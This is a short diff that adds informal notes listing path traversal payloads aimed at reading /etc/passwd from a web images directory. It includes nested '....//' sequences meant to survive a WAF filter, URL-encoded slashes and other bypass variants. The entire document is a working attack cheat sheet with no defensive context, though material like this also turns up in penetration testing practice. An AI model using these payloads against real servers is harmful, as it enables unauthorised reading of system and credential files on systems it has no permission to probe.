@@ -1,0 +1,10 @@
+payload ../../../../etc/passwd normal current dir var/www/images
+encode it 
+payload : ....//....//....//....//etc/passwd 
+if waf Filter the payload 1 secnario ....//....//....//....//etc/passwd
+after Filterring it is ../../../../etc/passwd
+
+try :-
+...././.././../etc/passwd
+..%2f..%2f..%2fetc/passwd
+.../../etc/passwd
